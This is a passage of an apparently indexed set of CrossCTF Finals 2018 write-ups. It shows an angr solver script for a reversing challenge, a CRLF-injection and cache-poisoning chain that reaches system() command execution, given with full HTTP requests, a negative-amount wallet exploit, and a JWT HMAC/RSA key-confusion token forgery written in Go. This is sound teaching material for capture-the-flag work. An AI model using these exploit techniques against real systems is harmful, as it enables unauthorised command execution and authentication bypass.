scanf4 = claripy.BVS('scanf4', 64) scanf5 = claripy.BVS('scanf5', 64) scanf6 = claripy.BVS('scanf6', 64) scanf7 = claripy.BVS('scanf7', 64) scanf8 = claripy.BVS('scanf8', 64) scanf9 = claripy.BVS('scanf9', 64) scanf10 = claripy.BVS('scanf10', 64) # The scanf function writes user input to the buffers to which the # parameters point. self.state.memory.store(s1, scanf1, endness=project.arch.memory_endness) self.state.memory.store(s2, scanf2, endness=project.arch.memory_endness) self.state.memory.store(s3, scanf3, endness=project.arch.memory_endness) self.state.memory.store(s4, scanf4, endness=project.arch.memory_endness) self.state.memory.store(s5, scanf5, endness=project.arch.memory_endness) self.state.memory.store(s6, scanf6, endness=project.arch.memory_endness) self.state.memory.store(s7, scanf7, endness=project.arch.memory_endness) self.state.memory.store(s8, scanf8, endness=project.arch.memory_endness) self.state.memory.store(s9, scanf9, endness=project.arch.memory_endness) self.state.memory.store(s10, scanf10, endness=project.arch.memory_endness) self.state.globals['solutions'].append(scanf1) self.state.globals['solutions'].append(scanf2) self.state.globals['solutions'].append(scanf3) self.state.globals['solutions'].append(scanf4) self.state.globals['solutions'].append(scanf5) self.state.globals['solutions'].append(scanf6) self.state.globals['solutions'].append(scanf7) self.state.globals['solutions'].append(scanf8) self.state.globals['solutions'].append(scanf9) self.state.globals['solutions'].append(scanf10) self.state.regs.rax = 10 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) instruction_to_skip_length = 5 @project.hook(0x40126f, length=instruction_to_skip_length) def skip_printf(state): pass Then, I created a simulation_manager to explore the binary, with the target address at 0x401441, which is the first instruction after we passed the check, and to avoid 0x40145d, which is the first instruction after we failed the check. simgr = project.factory.simgr(initial_state) simgr.explore(find=0x401441, avoid=0x40145d) If the simulation managed to reach the target address, print out the values in our input. if simgr.found: print 'found' solution_state = simgr.found[0] # Grab whatever you set aside in the globals dict. stored_solutions = solution_state.globals['solutions'] for i in range(len(stored_solutions)): sol = solution_state.se.eval(stored_solutions[i]) # 2's complement sol = -(0x10000000000000000 - sol) if sol >= 0x8000000000000000 else sol sys.stdout.write(str(sol)) sys.stdout.write(' ') print '' else: raise Exception('Could not find the solution') Notice that since the program called scanf to read in signed integers, and claripy (angr's solver engine) gives us the unsigned value, I needed to find the 2's complement myself. Anyways, running the script, and waiting for around 4 minutes gave me 10 numbers. But the program tells me FAIL ... But I felt confident that using angr should work, I must be missing something then. And, I realized the printf is used to print an address in the stack, and it says \"this address may be interesting\". So I asked my teammate why is this useful, then big realization oh right there were some parts where pointers were casted into integers. Some re-addressing Fixing this was pretty easy, just initialize the stack frame of our state. And choose our state to start at the first instruction after printf was called, since everything before that was just lame stuff like function prologue, saving stack canary, calling ptrace so that we couldn't run gdb, etc. leak = sys.argv[2] initial_state = project.factory.blank_state(addr=0x401274) initial_state.regs.rsp = leak - 0x60 initial_state.regs.rbp = leak + 0x100 Instead of just running the script, this time we need to get the address from the service first, after that waiting for another painful 4 minutes, we get the flag. CrossCTF{@n_Un1iK3Ly_Un10n}","title":"Tower Of Beer: Rochefort 8"},{"location":"crossctf-finals2018/re/rochefort8/#crossctf-finals-2018-rochefort-8-re","text":"Why have a Rochefort 6 when you can have a Rochefort 8? nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) towerofbeer","title":"CrossCTF Finals 2018 : Rochefort 8 (re)"},{"location":"crossctf-finals2018/re/rochefort8/#analysis","text":"Like rochefort6 , it asks for a number, we choose 8, then it presents us with the challenge. Being noob and using IDA gives us unsigned __int64 sub_401209() { __int64 v1; // [rsp+8h] [rbp-158h] char v2; // [rsp+10h] [rbp-150h] __int64 v3; // [rsp+30h] [rbp-130h] __int64 v4; // [rsp+38h] [rbp-128h] __int64 v5; // [rsp+58h] [rbp-108h] int v6; // [rsp+60h] [rbp-100h] int *v7; // [rsp+68h] [rbp-F8h] int *v8; // [rsp+70h] [rbp-F0h] __int64 v9; // [rsp+78h] [rbp-E8h] int *v10; // [rsp+80h] [rbp-E0h] int v11; // [rsp+88h] [rbp-D8h] __int64 v12; // [rsp+90h] [rbp-D0h] int *v13; // [rsp+98h] [rbp-C8h] int *v14; // [rsp+A0h] [rbp-C0h] __int64 *v15; // [rsp+A8h] [rbp-B8h] int v16; // [rsp+B0h] [rbp-B0h] __int64 v17; // [rsp+B8h] [rbp-A8h] int *v18; // [rsp+C0h] [rbp-A0h] int *v19; // [rsp+C8h] [rbp-98h] __int64 v20; // [rsp+D0h] [rbp-90h] int v21; // [rsp+D8h] [rbp-88h] __int64 *v22; // [rsp+E0h] [rbp-80h] __int64 v23; // [rsp+E8h] [rbp-78h] __int64 v24; // [rsp+F0h] [rbp-70h] __int64 v25; // [rsp+F8h] [rbp-68h] int v26; // [rsp+100h] [rbp-60h] __int64 *v27; // [rsp+108h] [rbp-58h] __int64 v28; // [rsp+110h] [rbp-50h] __int64 v29; // [rsp+118h] [rbp-48h] __int64 v30; // [rsp+120h] [rbp-40h] int v31; // [rsp+128h] [rbp-38h] __int64 v32; // [rsp+130h] [rbp-30h] __int64 v33; // [rsp+138h] [rbp-28h] int *v34; // [rsp+140h] [rbp-20h] __int64 v35; // [rsp+148h] [rbp-18h] unsigned __int64 v36; // [rsp+158h] [rbp-8h] v36 = __readfsqword(0x28u); if ( ptrace(0, 0LL, 1LL, 0LL) == -1 ) { puts(\"Something bad happened!\"); exit(1); } printf(\"This address may be interesting...\\n0x%lx\\n\", &v6); v6 = 3; v11 = 5; v16 = 1; v21 = 6; v26 = 2; v31 = 4; v7 = &v11; v8 = &v16; v9 = 0LL; v10 = &v11; v12 = -3LL; v13 = &v21; v14 = &v26; v15 = &v4; v17 = 0x7FFFFFFFFFFFFFFFLL; v18 = &v26; v19 = &v31; v20 = 0LL; v22 = &v3; v23 = 0LL; v24 = 0LL; v25 = -3405691582LL; v27 = &v5; v28 = 0LL; v29 = 0LL; v30 = -1LL; v32 = 0LL; v33 = 1LL; v34 = &v21; v35 = 0LL; puts(\"Now let's see if you can read my mind. Give me 10 numbers!\"); sub_4009D6((__int64)&v2); v1 = 0LL; some_func((__int64)&v6, (__int64)&v2, &v1); if ( v1 != 5 ) { puts(\"FAIL\"); exit(1); } sub_400CAC(); return __readfsqword(0x28u) ^ v36; } __int64 __fastcall sub_4009D6(__int64 a1) { __int64 result; // rax result = (signed int)__isoc99_scanf( \"%ld %ld %ld %ld %ld %ld %ld %ld %ld %ld\", a1, a1 + 8, a1 + 16, a1 + 24, a1 + 32, a1 + 40, a1 + 48, a1 + 56, a1 + 64, a1 + 72); if ( (unsigned __int64)(signed int)result <= 9 ) { puts(\"FAIL\"); exit(1); } return result; } __int64 __fastcall some_func(__int64 a1, __int64 a2, _QWORD *a3) { __int64 result; // rax _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+30h] [rbp-10h] __int64 v6; // [rsp+38h] [rbp-8h] v4 = a3; v5 = sub_400D4E(a1); result = sub_400DC3(a1); v6 = result; if ( v5 ) { if ( (unsigned __int8)sub_400F22(a1, v5, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 1) ) ++*v4; result = some_func(v5, a2, v4); } if ( v6 ) { if ( (unsigned __int8)sub_400F22(a1, v6, *(_QWORD *)(8LL * *v4 + a2), *(_QWORD *)(8 * (*v4 + 5LL) + a2), 0) ) ++*v4; result = some_func(v6, a2, v4); } return result; } _BOOL8 __fastcall sub_400F22(__int64 a1, __int64 a2, __int64 a3, __int64 a4, char a5) { char v6; // [rsp+4h] [rbp-74h] __int64 v7; // [rsp+8h] [rbp-70h] __int64 v8; // [rsp+10h] [rbp-68h] __int64 v9; // [rsp+28h] [rbp-50h] __int64 v10; // [rsp+30h] [rbp-48h] __int64 v11; // [rsp+38h] [rbp-40h] __int64 v12; // [rsp+40h] [rbp-38h] __int64 v13; // [rsp+58h] [rbp-20h] __int64 v14; // [rsp+60h] [rbp-18h] v8 = a3; v7 = a4; v6 = a5; v9 = sub_400E38(a1); v10 = sub_400E38(a2); if ( v6 ) { if ( v9 <= v8 ) return 0LL; } else if ( v9 >= v8 ) { return 0LL; } if ( v8 == v10 ) return 0LL; v11 = sub_400D4E(a2); v12 = sub_400DC3(a2); if ( v11 && sub_400E38(v11) >= v8 ) return 0LL; if ( v12 && sub_400E38(v12) <= v8 ) return 0LL; v13 = sub_400EAD(a1); v14 = sub_400EAD(a2); if ( v6 ) { if ( v13 <= v7 ) return 0LL; } else if ( v13 >= v7 ) { return 0LL; } if ( v7 == v14 ) return 0LL; if ( v11 && sub_400EAD(v11) >= v7 ) return 0LL; return !v12 || sub_400EAD(v12) > v7; } Very long code, to summarize, it Prints out an address on the stack Does a ton of initialization on the variables Calls scanf to read in 10 signed integers Calls some_func (it was a stripped binary, I named it this) with some paremeters, that seemed to be stack addresses casted to integer. If the result is equal to 5, print flag In some_func and sub_400F22 , we see 3 more different functions. __int64 __fastcall sub_400D4E(__int64 a1) { __int64 result; // rax if ( !a1 ) return 0LL; switch ( *(_DWORD *)a1 ) { case 1: result = *(_QWORD *)(a1 + 24); break; case 2: result = *(_QWORD *)(a1 + 16); break; case 3: result = *(_QWORD *)(a1 + 8); break; case 4: result = *(_QWORD *)(a1 + 32); break; case 5: result = *(_QWORD *)(a1 + 16); break; case 6: result = *(_QWORD *)(a1 + 24); break; default: result = 0LL; break; } return result; } This function uses the argument passed in as an array, and returns the value in an index that is based on the first element in the array. The other 2 were pretty much the same, just that the offset values were different.","title":"Analysis"},{"location":"crossctf-finals2018/re/rochefort8/#reversing-them","text":"Lots of functions, lots of adding and subtracting, lots of casting from integer to pointer, and seems like there's even recursion. It's gonna be a pain to reverse them. So nah man I didn't want to reverse this. I just used angr to do the work. Yes, I really didn't bother reversing it at all.","title":"Reversing them"},{"location":"crossctf-finals2018/re/rochefort8/#solution","text":"I wrote a script with angr to make things easier. (The following is more of my thought process, if not interested, looking at the script should be enough) First things first, create a project in angr, and initialize a state that starts at sub_401209 , which is the function called after we enter \"8\" into the program (because everything before that is useless). binary_name = sys.argv[1] project = angr.Project(binary_name) initial_state = project.factory.blank_state(addr=0x401209) Also, I have to \"define\" scanf myself because angr does not work well with format string related stuff. Inside my own scanf , I created 10 symbolic values to represent our input, and store them in memory. In the end, set return value to be 10, because the program checks for it. That being said, I also have to \"skip\" the instruction at 0x40126f which calls printf . (If you reversed the binary, you may feel that something's wrong, because the output of printf is important. Yes, I made a mistake, which I'll mention later.) initial_state.globals['solutions'] = [] class ReplacementScanf(angr.SimProcedure): def run(self, format_string, s1, s2, s3, s4, s5, s6, s7, s8, s9, s10): scanf1 = claripy.BVS('scanf1', 64) scanf2 = claripy.BVS('scanf2', 64) scanf3 = claripy.BVS('scanf3', 64) scanf4 = claripy.BVS('scanf4', 64) scanf5 = claripy.BVS('scanf5', 64) scanf6 = claripy.BVS('scanf6', 64) scanf7 = claripy.BVS('scanf7', 64) scanf8 = claripy.BVS('scanf8', 64) scanf9 = claripy.BVS('scanf9', 64) scanf10 = claripy.BVS('scanf10', 64) # The scanf function writes user input to the buffers to which the # parameters point. self.state.memory.store(s1, scanf1, endness=project.arch.memory_endness) self.state.memory.store(s2, scanf2, endness=project.arch.memory_endness) self.state.memory.store(s3, scanf3, endness=project.arch.memory_endness) self.state.memory.store(s4, scanf4, endness=project.arch.memory_endness) self.state.memory.store(s5, scanf5, endness=project.arch.memory_endness) self.state.memory.store(s6, scanf6, endness=project.arch.memory_endness) self.state.memory.store(s7, scanf7, endness=project.arch.memory_endness) self.state.memory.store(s8, scanf8, endness=project.arch.memory_endness) self.state.memory.store(s9, scanf9, endness=project.arch.memory_endness) self.state.memory.store(s10, scanf10, endness=project.arch.memory_endness) self.state.globals['solutions'].append(scanf1) self.state.globals['solutions'].append(scanf2) self.state.globals['solutions'].append(scanf3) self.state.globals['solutions'].append(scanf4) self.state.globals['solutions'].append(scanf5) self.state.globals['solutions'].append(scanf6) self.state.globals['solutions'].append(scanf7) self.state.globals['solutions'].append(scanf8) self.state.globals['solutions'].append(scanf9) self.state.globals['solutions'].append(scanf10) self.state.regs.rax = 10 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) instruction_to_skip_length = 5 @project.hook(0x40126f, length=instruction_to_skip_length) def skip_printf(state): pass Then, I created a simulation_manager to explore the binary, with the target address at 0x401441, which is the first instruction after we passed the check, and to avoid 0x40145d, which is the first instruction after we failed the check. simgr = project.factory.simgr(initial_state) simgr.explore(find=0x401441, avoid=0x40145d) If the simulation managed to reach the target address, print out the values in our input. if simgr.found: print 'found' solution_state = simgr.found[0] # Grab whatever you set aside in the globals dict. stored_solutions = solution_state.globals['solutions'] for i in range(len(stored_solutions)): sol = solution_state.se.eval(stored_solutions[i]) # 2's complement sol = -(0x10000000000000000 - sol) if sol >= 0x8000000000000000 else sol sys.stdout.write(str(sol)) sys.stdout.write(' ') print '' else: raise Exception('Could not find the solution') Notice that since the program called scanf to read in signed integers, and claripy (angr's solver engine) gives us the unsigned value, I needed to find the 2's complement myself. Anyways, running the script, and waiting for around 4 minutes gave me 10 numbers. But the program tells me FAIL ... But I felt confident that using angr should work, I must be missing something then. And, I realized the printf is used to print an address in the stack, and it says \"this address may be interesting\". So I asked my teammate why is this useful, then big realization oh right there were some parts where pointers were casted into integers.","title":"Solution"},{"location":"crossctf-finals2018/re/rochefort8/#some-re-addressing","text":"Fixing this was pretty easy, just initialize the stack frame of our state. And choose our state to start at the first instruction after printf was called, since everything before that was just lame stuff like function prologue, saving stack canary, calling ptrace so that we couldn't run gdb, etc. leak = sys.argv[2] initial_state = project.factory.blank_state(addr=0x401274) initial_state.regs.rsp = leak - 0x60 initial_state.regs.rbp = leak + 0x100 Instead of just running the script, this time we need to get the address from the service first, after that waiting for another painful 4 minutes, we get the flag. CrossCTF{@n_Un1iK3Ly_Un10n}","title":"Some re-addressing"},{"location":"crossctf-finals2018/web/cachecreek/","text":"CrossCTF Finals 2018: CacheCreek (web) I wrote a new cache mechanism, it is pretty cool, can you please review it for me? http://ctf.pwn.sg:8181 Creator - quanyang (@quanyang) Challenge First, we explored the entire source tree. The index and login pages have nothing interesting, but if you put ?source=1 on other pages, you can get the source. First we find the cache reader, in cache.php: (From now on, we'll omit the unimportant parts) # http://ctf.pwn.sg:8181/cache.php?source=1 ... include_once(\"./curl.php\"); if (isset($_GET['report']) && $_GET['report'] === \"debug\") { $debug = url_get_contents(\"http://127.0.0.1/internal.php?debug\". session_id(), 60, \"index.php\",['debug'=>'True']); echo \"debug command: \".htmlentities($debug).\"<br/>\"; system($debug); echo 'debugged!'; die(); } echo \"Caching Admin's Profile:<br />\"; echo htmlentities(url_get_contents(\"http://127.0.0.1/internal.php?\". session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=>'admin'])); echo '<br /><br />'; ... Cool, it calls system()! There's the interesting file called curl.php . Must be some URL fetching tool # http://ctf.pwn.sg:8181/curl.php?source=1 /* Adapted from a cache written by Carlo Alberto Ferraris <cafxx@strayorange.com> */ function cache($url, $min_expiration, $referer=\"\", $params) { $min_expiration = max( intval( $min_expiration ), 1 ); $cache_key = hash('sha256',$url) or die(); $cache_file = CACHE_PREFIX . $cache_key; $cache_file_fullpath = CACHE_DIR . '/' . $cache_file; $cache_file_mtime = @filemtime($cache_file_fullpath); // If there's a cached file, this code reads from the file ... // If there isn't, fetch the URL and save to the file ... } function url_get_contents($url, $min_expiration=60, $referer=\"\", $params=Array()) { return file_get_contents( cache( $url, $min_expiration, $referer, $params)); } The contents of the thing it puts into system() : include_once('./curl.php'); // We haz checks method and referer for security!11 if ($_SERVER['REQUEST_METHOD'] == \"POST\" && strpos($_SERVER['HTTP_REFERER'], 'index.php') !== False ) { if ($_POST['debug'] === \"True\") { // Maybe delete the tmp directory echo 'rm -f '. CACHE_DIR . '/'.CACHE_PREFIX.'*'; } else if (isset($_POST['view'])) { $connObj = new dbConn(); $profile = $connObj->getProfile($_POST['view'])['profile']; echo $profile; } } else { die(\"die hax0r!!11\"); } This can't be a SQLi thing. This must have something to do with caching as the title suggests. And I noticed that I could inject request body into CURL by setting $referrer to the \"rest\" of the HTTP request. export user='dadada' length=11 http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\" This kinda produces a HTTP request to view any user. I also found out I could modify the request URI by setting SESSID cookie since session_id() was put into the request URL: http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=True%26source%3D1 We didn't know how to proceed after this and stared at it for hours. With some luck, we got reminded about cache poisoning! Completely forgot that was a thing. Ugh. So the cache function importantly uses the URL to generate the filename to store the file contents. If we could make the debug function in cache.php read the wrong cache file, it could execute arbitrary code using system(). To exploit this, we have to make it store a cache file maliciously using the profile caching thing (sorry I'm sleepy). That means we have to produce the same URL as the URL that the debug code would look up ( \"http://127.0.0.1/internal.php?debug\". session_id() ), inside the profile lookup code. Since the profile lookup code requsts from \"http://127.0.0.1/internal.php?\". session_id() , we can substitute session_id() for debug and we'll get the same internal URL! # full cached url would be http://127.0.0.1/internal.php?debug # Poison cache with profile of \"admin\" http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=debug Referer:index.php # Poison cache with profile of \"dadada\" export user='dadada' length=11 http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\" Cookie:PHPSESSID=debug Now we need to execute that code inside the cached file: # full cached url would be http://127.0.0.1/internal.php?debug http -v --form POST http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID= Referer:index.php report==debug POST /cache.php?report=debug HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate Connection: keep-alive Content-Length: 0 Content-Type: application/x-www-form-urlencoded; charset=utf-8 Cookie: PHPSESSID= Host: ctf.pwn.sg:8181 Referer: index.php User-Agent: HTTPie/0.9.9 HTTP/1.1 200 OK Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Connection: close Content-Encoding: gzip Content-Length: 104 Content-Type: text/html Date: Mon, 18 Jun 2018 20:01:05 GMT Expires: Thu, 19 Nov 1981 08:52:00 GMT Pragma: no-cache Server: Apache/2.4.7 (Ubuntu) Vary: Accept-Encoding X-Powered-By: PHP/5.5.9-1ubuntu4.25 debug command: cat /flag.txt<br/>CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3} debugged! Yay!","title":"CacheCreek"},{"location":"crossctf-finals2018/web/cachecreek/#crossctf-finals-2018-cachecreek-web","text":"I wrote a new cache mechanism, it is pretty cool, can you please review it for me? http://ctf.pwn.sg:8181 Creator - quanyang (@quanyang)","title":"CrossCTF Finals 2018: CacheCreek (web)"},{"location":"crossctf-finals2018/web/cachecreek/#challenge","text":"First, we explored the entire source tree. The index and login pages have nothing interesting, but if you put ?source=1 on other pages, you can get the source. First we find the cache reader, in cache.php: (From now on, we'll omit the unimportant parts) # http://ctf.pwn.sg:8181/cache.php?source=1 ... include_once(\"./curl.php\"); if (isset($_GET['report']) && $_GET['report'] === \"debug\") { $debug = url_get_contents(\"http://127.0.0.1/internal.php?debug\". session_id(), 60, \"index.php\",['debug'=>'True']); echo \"debug command: \".htmlentities($debug).\"<br/>\"; system($debug); echo 'debugged!'; die(); } echo \"Caching Admin's Profile:<br />\"; echo htmlentities(url_get_contents(\"http://127.0.0.1/internal.php?\". session_id(), 60, urldecode($_SERVER['HTTP_REFERER']),['view'=>'admin'])); echo '<br /><br />'; ... Cool, it calls system()! There's the interesting file called curl.php . Must be some URL fetching tool # http://ctf.pwn.sg:8181/curl.php?source=1 /* Adapted from a cache written by Carlo Alberto Ferraris <cafxx@strayorange.com> */ function cache($url, $min_expiration, $referer=\"\", $params) { $min_expiration = max( intval( $min_expiration ), 1 ); $cache_key = hash('sha256',$url) or die(); $cache_file = CACHE_PREFIX . $cache_key; $cache_file_fullpath = CACHE_DIR . '/' . $cache_file; $cache_file_mtime = @filemtime($cache_file_fullpath); // If there's a cached file, this code reads from the file ... // If there isn't, fetch the URL and save to the file ... } function url_get_contents($url, $min_expiration=60, $referer=\"\", $params=Array()) { return file_get_contents( cache( $url, $min_expiration, $referer, $params)); } The contents of the thing it puts into system() : include_once('./curl.php'); // We haz checks method and referer for security!11 if ($_SERVER['REQUEST_METHOD'] == \"POST\" && strpos($_SERVER['HTTP_REFERER'], 'index.php') !== False ) { if ($_POST['debug'] === \"True\") { // Maybe delete the tmp directory echo 'rm -f '. CACHE_DIR . '/'.CACHE_PREFIX.'*'; } else if (isset($_POST['view'])) { $connObj = new dbConn(); $profile = $connObj->getProfile($_POST['view'])['profile']; echo $profile; } } else { die(\"die hax0r!!11\"); } This can't be a SQLi thing. This must have something to do with caching as the title suggests. And I noticed that I could inject request body into CURL by setting $referrer to the \"rest\" of the HTTP request. export user='dadada' length=11 http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\" This kinda produces a HTTP request to view any user. I also found out I could modify the request URI by setting SESSID cookie since session_id() was put into the request URL: http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=True%26source%3D1 We didn't know how to proceed after this and stared at it for hours. With some luck, we got reminded about cache poisoning! Completely forgot that was a thing. Ugh. So the cache function importantly uses the URL to generate the filename to store the file contents. If we could make the debug function in cache.php read the wrong cache file, it could execute arbitrary code using system(). To exploit this, we have to make it store a cache file maliciously using the profile caching thing (sorry I'm sleepy). That means we have to produce the same URL as the URL that the debug code would look up ( \"http://127.0.0.1/internal.php?debug\". session_id() ), inside the profile lookup code. Since the profile lookup code requsts from \"http://127.0.0.1/internal.php?\". session_id() , we can substitute session_id() for debug and we'll get the same internal URL! # full cached url would be http://127.0.0.1/internal.php?debug # Poison cache with profile of \"admin\" http -v http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID=debug Referer:index.php # Poison cache with profile of \"dadada\" export user='dadada' length=11 http -v --form POST http://ctf.pwn.sg:8181/cache.php Referer:\"index.php%0D%0AContent-Length%3A%20$length%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0A%0D%0Aview%3D$user\" Cookie:PHPSESSID=debug Now we need to execute that code inside the cached file: # full cached url would be http://127.0.0.1/internal.php?debug http -v --form POST http://ctf.pwn.sg:8181/cache.php Cookie:PHPSESSID= Referer:index.php report==debug POST /cache.php?report=debug HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate Connection: keep-alive Content-Length: 0 Content-Type: application/x-www-form-urlencoded; charset=utf-8 Cookie: PHPSESSID= Host: ctf.pwn.sg:8181 Referer: index.php User-Agent: HTTPie/0.9.9 HTTP/1.1 200 OK Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Connection: close Content-Encoding: gzip Content-Length: 104 Content-Type: text/html Date: Mon, 18 Jun 2018 20:01:05 GMT Expires: Thu, 19 Nov 1981 08:52:00 GMT Pragma: no-cache Server: Apache/2.4.7 (Ubuntu) Vary: Accept-Encoding X-Powered-By: PHP/5.5.9-1ubuntu4.25 debug command: cat /flag.txt<br/>CrossCTF{Dont_h@te_tHe_aUth0r_hat3_d@_gam3} debugged! Yay!","title":"Challenge"},{"location":"crossctf-finals2018/web/gocoin/","text":"CrossCTF Finals 2018: GoCoin! (web) I thought blockchain was cool, so I made my own coin. http://ctf.pwn.sg:8182 Creator - quanyang (@quanyang) Challenge We are given a nice site, that emulates a wallet. Clicking on deposit and withdraw goes to /deposit?amount=1 and /withdraw?amount=1 respectively. Instincts are to see if you can input other amounts. Messing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of Computer Organisation lessons?) If you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet! I'm not gonna go into floating point operations and stop here. Must have been some rounding errors! Alternative exploit Yes, I actually missed this exploit that I only realised in GoCoin! Plus . You could simply specify negative amounts because it missed out negative checks:","title":"GoCoin!"},{"location":"crossctf-finals2018/web/gocoin/#crossctf-finals-2018-gocoin-web","text":"I thought blockchain was cool, so I made my own coin. http://ctf.pwn.sg:8182 Creator - quanyang (@quanyang)","title":"CrossCTF Finals 2018: GoCoin! (web)"},{"location":"crossctf-finals2018/web/gocoin/#challenge","text":"We are given a nice site, that emulates a wallet. Clicking on deposit and withdraw goes to /deposit?amount=1 and /withdraw?amount=1 respectively. Instincts are to see if you can input other amounts. Messing around, we figured out that if you keep adding 0.01 coins, you'll encounter some nice floating point math quirks. (Doesn't it remind you of Computer Organisation lessons?) If you continue until you have 0.35000000000000003 coins, then start adding 0.005 coins, you can fill your bank while having 0.35000000000000003 coins in your wallet! I'm not gonna go into floating point operations and stop here. Must have been some rounding errors!","title":"Challenge"},{"location":"crossctf-finals2018/web/gocoin/#alternative-exploit","text":"Yes, I actually missed this exploit that I only realised in GoCoin! Plus . You could simply specify negative amounts because it missed out negative checks:","title":"Alternative exploit"},{"location":"crossctf-finals2018/web/gocoinplus/","text":"CrossCTF Finals 2018: GoCoin! Plus (web) I thought blockchain was cool, so I made my own coin. GoCoin! Plus is the forked and improved version of GoCoin!. Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! http://ctf.pwn.sg:2053 Creator - quanyang (@quanyang) Challenge Okay, the organisers made a mistake in this one. See GoCoin! Plus Plus for the real solution. So, a nice webpage. The first time you load it you get a nice message meant for you: Here's the page you get to after a refresh. The public key gave us a hint. Does it have something to do with crypto? Similar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page. When we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.","title":"GoCoin! Plus"},{"location":"crossctf-finals2018/web/gocoinplus/#crossctf-finals-2018-gocoin-plus-web","text":"I thought blockchain was cool, so I made my own coin. GoCoin! Plus is the forked and improved version of GoCoin!. Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! http://ctf.pwn.sg:2053 Creator - quanyang (@quanyang)","title":"CrossCTF Finals 2018: GoCoin! Plus (web)"},{"location":"crossctf-finals2018/web/gocoinplus/#challenge","text":"Okay, the organisers made a mistake in this one. See GoCoin! Plus Plus for the real solution. So, a nice webpage. The first time you load it you get a nice message meant for you: Here's the page you get to after a refresh. The public key gave us a hint. Does it have something to do with crypto? Similar to the previous challenge, it's got the same buttons with the same URL. Just wrapped in a fancier page. When we looked at the source provided, we first noticed it used JWT. However, before looking for implementation flaws, we noticed the flaw we didn't notice in the previous challenge: There was no check for the amount entered being less than 0. So we exploited it right away.","title":"Challenge"},{"location":"crossctf-finals2018/web/gocoinplusplus/","text":"CrossCTF Finals 2018: GoCoin! Plus Plus (web) I thought blockchain was cool, so I made my own coin. GoCoin! Plus Plus is the forked and improved version of GoCoin! Plus. Update: I've improved it! More secures and with real cryptos, it's a true cryptocoin now! Update: Stupid me wrote a broken challenge, now its really fixed! http://ctf.pwn.sg:1389 Creator - quanyang (@quanyang) Challenge So this is the real challenge, fixed by the organisers. TL; DR: 54c54 < walletString := this.Ctx.GetCookie(\"wallet\") --- > walletString := this.Ctx.GetCookie(\"wallet_2\") ... 92c92 < if err != nil { --- > if err != nil || amount < 0 { ... 141c141 < if err != nil { --- > if err != nil || amount < 0 { ... So this makes the previous exploit unexploitable. Time to look back at the JWT implementation. My familiarity with Go made the code 2x easier to read. Because of the hints about crypto being used, it pointed us pretty clearly at the JWT code. If you didn't know yet, JWS stands for JSON Web Tokens. It's a authorization token that can contain data, and makes token validation stateless other than validation of the signature attached using PKI. It was pretty well-know that JWT had an issue previously where things with alg: none . It's even stated in a banner on the JWT website. So, I took a look at the ParseWallet function. func ParseWallet(myToken string, myKey []byte) (float64, float64, error) { token, err := jwt.Parse(myToken, func(token *jwt.Token) (interface{}, error) { if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { key, err := jwt.ParseRSAPublicKeyFromPEM(myKey) return key, err } return myKey, nil }) if err == nil && token.Valid { ... From this chunk of code, you can see that the program checks for tokens that are not HMAC and then parses the PEM public key. But, if the token is a HMAC, it directly returns the key! This is especially obvious if you compare it to the example code for HMAC in the documentation for github.com/dgrijalva/jwt-go , and notices in the project README. Since the plaintext public key is being used to perform HMAC comparison rather than validating RSA signatures, we can forge our own tokens because we know the HMAC secret, which is the []byte publicKey. So let's write a program to create this HMACed instead of RSAed token. Oh wait, it's already written by the challenge author! Just need to change one tiny bit. token := jwt.New(jwt.GetSigningMethod(\"HS256\")) Then now I can do: myKey := `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyg+EcZOSLYXqdA0Gdx6hE0PFY GshbSxHwBbZ0Ivw41OCD447WtiTmBKWhYkyZIW1uF2G0YpifP9CGZgIHhW6jPUwB u1ewHy0ch+GQeMleaVGqEOsAd65DAXi2TSCZLl66zWy0enQ/SFkm9OTTGYR0e0hM DFqKsA30lPd0pHbSNwIDAQAB -----END PUBLIC KEY----- ` // This newline is important tokenString, err := Wallet(10000, 10000, []byte(myKey)) fmt.Println(err, tokenString) _, _, err := ParseWallet(tokenString, myKey) fmt.Println(err) // nil is SUCCESS! wohoo Here's the full code . Now I've got a valid token, I can simply perform the request to /flag with the token set inside the cookie. Many ways to do that, including using DevTools.","title":"GoCoin! Plus 